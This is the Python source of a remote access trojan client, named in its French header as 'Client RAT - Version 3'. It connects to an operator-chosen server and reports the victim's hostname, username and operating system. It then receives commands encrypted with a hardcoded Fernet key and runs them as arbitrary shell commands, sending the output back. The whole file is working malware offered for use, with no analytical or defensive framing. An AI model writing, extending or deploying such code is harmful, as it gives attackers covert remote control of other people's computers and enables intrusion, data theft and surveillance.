#!/usr/bin/env python3
"""
Client RAT - Version 3 avec corrections de connexion
"""
import socket
import json
import time
import platform
import subprocess
import getpass
from cryptography.fernet import Fernet

class RATClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        
        self.key = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='
        self.cipher = Fernet(self.key)
        
    def _send_message(self, message):
        """Envoie un message avec protocole de taille"""
        try:
            json_data = json.dumps(message)
            encrypted_data = self.cipher.encrypt(json_data.encode('utf-8'))
            
            # Envoie la taille d'abord
            size_bytes = len(encrypted_data).to_bytes(4, 'big')
            self.socket.sendall(size_bytes)
            self.socket.sendall(encrypted_data)
            return True
        except Exception as e:
            print(f"[DEBUG] Erreur envoi: {e}")
            return False
    
    def _receive_message(self):
        """Reçoit un message complet"""
        try:
            # Lit la taille
            size_data = b''
            while len(size_data) < 4:
                chunk = self.socket.recv(4 - len(size_data))
                if not chunk:
                    return None
                size_data += chunk
            
            message_size = int.from_bytes(size_data, 'big')
            
            # Lit le message
            message_data = b''
            while len(message_data) < message_size:
                chunk = self.socket.recv(message_size - len(message_data))
                if not chunk:
                    return None
                message_data += chunk
            
            return message_data
        except Exception as e:
            print(f"[DEBUG] Erreur réception: {e}")
            return None
    
    def connect(self):
        """Se connecte au serveur"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_host, self.server_port))
            
            # Handshake plus complet
            client_info = {
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'os': platform.system(),
                'timestamp': time.time()
            }
            
            if not self._send_message(client_info):
                return False
            
            print(f"[+] Connecté au serveur")
            return True
        except Exception as e:
            print(f"[-] Erreur de connexion: {e}")
            return False
    
    def execute_command(self, command, args):
        """Exécute une commande"""
        try:
            if command == "help":
                return self.cmd_help()
            elif command == "ipconfig":
                return self.cmd_ipconfig()
            elif command == "shell":
                return self.cmd_shell(args)
            else:
                return {'output': f'Commande non supportée: {command}'}
        except Exception as e:
            return {'output': f'Erreur: {str(e)}'}
    
    def cmd_help(self):
        """Commande help"""
        help_text = """Commandes disponibles:
  help      - Affiche cette aide
  ipconfig  - Configuration réseau
  shell     - Exécute une commande
"""
        return {'output': help_text}
    
    def cmd_ipconfig(self):
        """Commande ipconfig"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["ipconfig"], capture_output=True, text=True, timeout=5)
            else:
                result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5)
            
            return {'output': result.stdout if result.returncode == 0 else result.stderr}
        except Exception as e:
            return {'output': f'Erreur ipconfig: {str(e)}'}
    
    def cmd_shell(self, args):
        """Commande shell - VERSION BASIQUE"""
        if not args:
            return {'output': 'Usage: shell <commande>'}
        
        try:
            command = " ".join(args)
            # LIMITATION: timeout court, pas de gestion d'erreur avancée
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return {'output': result.stdout + result.stderr}
        except subprocess.TimeoutExpired:
            return {'output': 'Timeout commande'}
        except Exception as e:
            return {'output': f'Erreur shell: {str(e)}'}
    
    def start(self):
        """Démarre le client"""
        if not self.connect():
            return
        
        self.running = True
        print("[*] Client démarré - En attente de commandes")
        
        while self.running:
            try:
                data = self._receive_message()
                if not data:
                    break
                
                decrypted_data = self.cipher.decrypt(data)
                command_data = json.loads(decrypted_data.decode('utf-8'))
                
                if command_data.get('type') == 'command':
                    command = command_data.get('command')
                    args = command_data.get('args', [])
                    
                    print(f"[*] Exécution: {command}")
                    result = self.execute_command(command, args)
                    self._send_message(result)
                
            except Exception as e:
                print(f"[-] Erreur traitement: {e}")
                break
        
        self.cleanup()
    
    def cleanup(self):
        self.running = False
        if self.socket:
            self.socket.close()
        print("[*] Client arrêté")

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="Adresse serveur")
    parser.add_argument("port", type=int, help="Port serveur")
    args = parser.parse_args()
    
    client = RATClient(args.host, args.port)
    client.start()

if __name__ == "__main__":
    main()